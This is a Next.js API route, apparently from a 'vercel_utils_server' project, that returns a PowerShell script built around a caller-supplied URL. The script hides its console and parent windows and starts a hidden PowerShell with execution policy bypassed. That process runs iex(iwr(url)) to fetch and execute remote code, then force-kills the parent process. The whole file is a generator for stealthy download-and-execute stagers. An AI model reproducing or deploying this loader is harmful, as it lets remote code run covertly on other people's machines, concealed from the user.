import { NextRequest, NextResponse } from 'next/server';

function escapeSpecialChars(input: string): string {
  let escaped = input
      .replace(/`/g, "``")   // Escape backticks
      .replace(/\$/g, "`$")  // Escape dollar signs
      .replace(/\+/g, "`+")  // Escape plus signs
      .replace(/#/g, "`#")   // Escape hash signs
      .replace(/"/g, '``"')  // Escape double quotes with backticks
      .replace(/'/g, "''");  // Escape single quotes with two single quotes
  return escaped;
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  let url = searchParams.get('url');
  if (!url) {
    return new NextResponse('Bad Request: "url" query parameter is required\nsee https://github.com/kaliiiiiiiiii/vercel_utils_server for usage', { status: 400 });
  }
  url = escapeSpecialChars(url)
  const script = 
`add-type -name user32 -namespace win32 -memberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
[win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0)
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
if($parent.ProcessName -ne "explorer"){[win32.user32]::showWindow($parent.mainWindowHandle, 0)};
$script = {
    Start-Sleep -Seconds 5
    Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
    Read-Host
    }
Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", "iex(iwr('${url}'))")
if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
Exit`
  return new NextResponse(script, {
    status: 200,
    headers: { 'Content-Type': 'text/plain' }
  });
}